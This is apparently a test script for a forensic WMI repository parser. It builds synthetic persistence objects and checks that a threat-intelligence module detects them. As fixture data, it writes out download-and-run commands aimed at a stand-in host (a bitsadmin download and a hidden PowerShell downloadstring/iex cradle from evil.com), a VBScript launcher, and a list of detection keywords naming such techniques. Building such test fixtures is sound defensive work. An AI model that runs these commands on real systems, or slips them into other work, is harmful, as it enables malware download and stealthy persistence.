#!/usr/bin/env python3
"""
Test script for Enhanced WMI Parser
Creates test data to validate parsing capabilities.
"""

import os
import struct
import tempfile
from enhanced_wmi_parser import EnhancedWMIParser
from wmi_threat_intelligence import WMIThreatIntelligence


def create_test_objects_data():
    """Create a test OBJECTS.DATA file with malicious patterns."""
    
    # Create test data with various WMI persistence patterns
    test_data = bytearray()
    
    # Repository header (32 bytes)
    header = struct.pack('<8I', 
                        0x12345678,  # Signature
                        1,           # Version
                        100,         # Page count
                        50,          # First free page
                        0, 0, 0, 0   # Reserved
                        )
    test_data.extend(header)
    
    # Test Object 1: FilterToConsumerBinding with PowerShell
    obj1_data = b'__FilterToConsumerBinding\x00\x00' + \
                b'Consumer\x00ActiveScriptEventConsumer.Name="MaliciousConsumer"\x00\x00' + \
                b'Filter\x00__EventFilter.Name="MaliciousFilter"\x00\x00' + \
                b'powershell.exe -enc SGVsbG8gV29ybGQ=\x00\x00'
    
    obj1_header = struct.pack('<IIII', len(obj1_data) + 16, 1, 0x12345678, 0)
    test_data.extend(obj1_header)
    test_data.extend(obj1_data)
    
    # Test Object 2: ActiveScriptEventConsumer with malicious script
    obj2_data = b'ActiveScriptEventConsumer\x00\x00' + \
                b'Name\x00MaliciousConsumer\x00\x00' + \
                b'ScriptText\x00CreateObject("WScript.Shell").Run("cmd.exe /c powershell -w hidden")\x00\x00' + \
                b'ScriptingEngine\x00VBScript\x00\x00'
    
    obj2_header = struct.pack('<IIII', len(obj2_data) + 16, 2, 0x87654321, 0)
    test_data.extend(obj2_header)
    test_data.extend(obj2_data)
    
    # Test Object 3: EventFilter with process monitoring
    obj3_data = b'__EventFilter\x00\x00' + \
                b'Name\x00MaliciousFilter\x00\x00' + \
                b'Query\x00SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName="cmd.exe"\x00\x00' + \
                b'QueryLanguage\x00WQL\x00\x00' + \
                b'EventNamespace\x00root\\cimv2\x00\x00'
    
    obj3_header = struct.pack('<IIII', len(obj3_data) + 16, 3, 0xABCDEF12, 0)
    test_data.extend(obj3_header)
    test_data.extend(obj3_data)
    
    # Test Object 4: CommandLineEventConsumer with suspicious command
    obj4_data = b'CommandLineEventConsumer\x00\x00' + \
                b'Name\x00SuspiciousConsumer\x00\x00' + \
                b'CommandLineTemplate\x00cmd.exe /c bitsadmin /transfer malware http://evil.com/payload.exe %temp%\\payload.exe\x00\x00' + \
                b'ExecutablePath\x00C:\\Windows\\System32\\cmd.exe\x00\x00'
    
    obj4_header = struct.pack('<IIII', len(obj4_data) + 16, 4, 0x11223344, 0)
    test_data.extend(obj4_header)
    test_data.extend(obj4_data)
    
    # Test Object 5: Potential APT signature
    obj5_data = b'SuspiciousObject\x00\x00' + \
                b'wmic process call create "powershell -nop -w hidden -c iex(new-object net.webclient).downloadstring(\'http://evil.com/script.ps1\')"\x00\x00'
    
    obj5_header = struct.pack('<IIII', len(obj5_data) + 16, 5, 0x55667788, 0)
    test_data.extend(obj5_header)
    test_data.extend(obj5_data)
    
    # Add some padding and potential deleted data
    test_data.extend(b'\x00' * 100)
    test_data.extend(b'__FilterToConsumerBinding_DELETED\x00')  # Simulate deleted binding
    test_data.extend(b'\x00' * 50)
    
    return bytes(test_data)


def test_threat_intelligence():
    """Test the threat intelligence module."""
    print("Testing Threat Intelligence Module...")
    
    ti = WMIThreatIntelligence()
    
    # Test samples
    test_samples = [
        (b'powershell.exe -enc SGVsbG8gV29ybGQ=', 'Encoded PowerShell'),
        (b'CreateObject("WScript.Shell").Run("cmd.exe")', 'VBScript execution'),
        (b'SELECT * FROM Win32_ProcessStartTrace', 'Process monitoring query'),
        (b'wmic process call create', 'WMIC process creation'),
        (b'invoke-expression', 'PowerShell IEX'),
        (b'downloadstring', 'PowerShell download'),
        (b'frombase64string', 'Base64 decoding'),
        (b'bitsadmin /transfer', 'BITS transfer'),
        (b'regsvr32.exe /s /u /i:', 'Regsvr32 bypass'),
    ]
    
    results = []
    for sample_data, description in test_samples:
        result = ti.analyze_object(sample_data, 'test_object')
        results.append(result)
        
        print(f"\nTest: {description}")
        print(f"  Threat Level: {result['threat_level']}")
        print(f"  Risk Score: {result['risk_score']}")
        print(f"  Indicators: {len(result['indicators'])}")
        
        for indicator in result['indicators']:
            print(f"    - {indicator['type']}: {indicator['severity']}")
    
    # Generate IOC report
    ioc_report = ti.generate_ioc_report(results)
    print(f"\nGenerated IOC Report:")
    print(f"  High-risk objects: {ioc_report['metadata']['high_risk_objects']}")
    print(f"  Command lines: {len(ioc_report['indicators']['command_lines'])}")
    print(f"  Scripts: {len(ioc_report['indicators']['scripts'])}")
    
    return results


def test_enhanced_parser():
    """Test the enhanced WMI parser with synthetic data."""
    print("\nTesting Enhanced WMI Parser...")
    
    # Create test OBJECTS.DATA file
    test_data = create_test_objects_data()
    
    # Write to temporary file
    with tempfile.NamedTemporaryFile(mode='wb', suffix='.dat', delete=False) as tmp_file:
        tmp_file.write(test_data)
        test_file_path = tmp_file.name
    
    try:
        # Test parser
        parser = EnhancedWMIParser()
        success = parser.parse_objects_data(test_file_path)
        
        if success:
            print(f"✅ Parser completed successfully!")
            print(f"  Persistence objects: {len(parser.persistence_objects)}")
            print(f"  Filter bindings: {len(parser.filter_bindings)}")
            print(f"  Event consumers: {len(parser.event_consumers)}")
            print(f"  Event filters: {len(parser.event_filters)}")
            print(f"  Suspicious objects: {len(parser.suspicious_classes)}")
            print(f"  WQL queries: {len(parser.wql_queries)}")
            print(f"  Threat analysis results: {len(parser.threat_analysis_results)}")
            
            # Test export functionality
            output_dir = tempfile.mkdtemp(prefix='wmi_test_')
            parser.export_results(output_dir)
            
            # Check exported files
            expected_files = [
                'wmi_persistence_objects.csv',
                'wmi_suspicious_objects.csv',
                'wmi_wql_queries.csv',
                'wmi_threat_analysis.csv',
                'wmi_persistence_chains.csv',
                'wmi_ioc_report.json'
            ]
            
            exported_files = os.listdir(output_dir)
            print(f"\nExported files: {len(exported_files)}")
            for file in exported_files:
                print(f"  - {file}")
            
            print(f"\nTest output directory: {output_dir}")
            
        else:
            print("❌ Parser failed!")
            
    finally:
        # Cleanup
        if os.path.exists(test_file_path):
            os.unlink(test_file_path)
    
    return success


def test_integration():
    """Test integration with main parser."""
    print("\nTesting Integration with Main Parser...")
    
    # This would test the integration with the main wbem_parser.py
    # For now, just verify imports work
    try:
        from wbem_parser import WBEMRepositoryParser
        print("✅ Main parser import successful")
        
        # Test that enhanced parser is properly integrated
        parser = WBEMRepositoryParser('.', './test_output')
        if hasattr(parser, 'enhanced_wmi_parser'):
            print("✅ Enhanced WMI parser integration successful")
        else:
            print("❌ Enhanced WMI parser not integrated")
            
    except ImportError as e:
        print(f"❌ Import error: {e}")
        return False
    
    return True


def main():
    """Run all tests."""
    print("Enhanced WMI Parser Test Suite")
    print("=" * 50)
    
    # Test threat intelligence
    ti_results = test_threat_intelligence()
    
    # Test enhanced parser
    parser_success = test_enhanced_parser()
    
    # Test integration
    integration_success = test_integration()
    
    print("\n" + "=" * 50)
    print("TEST SUMMARY")
    print("=" * 50)
    print(f"Threat Intelligence: ✅ {len(ti_results)} test cases")
    print(f"Enhanced Parser: {'✅' if parser_success else '❌'}")
    print(f"Integration: {'✅' if integration_success else '❌'}")
    
    if parser_success and integration_success:
        print("\n🎉 All tests passed! The enhanced parser is ready for use.")
        print("\nTo use the enhanced parser:")
        print("  python wbem_parser.py /path/to/repository ./output")
        print("  python enhanced_wmi_parser.py /path/to/OBJECTS.DATA ./analysis")
    else:
        print("\n⚠️  Some tests failed. Check the output above for details.")


if __name__ == "__main__":
    main()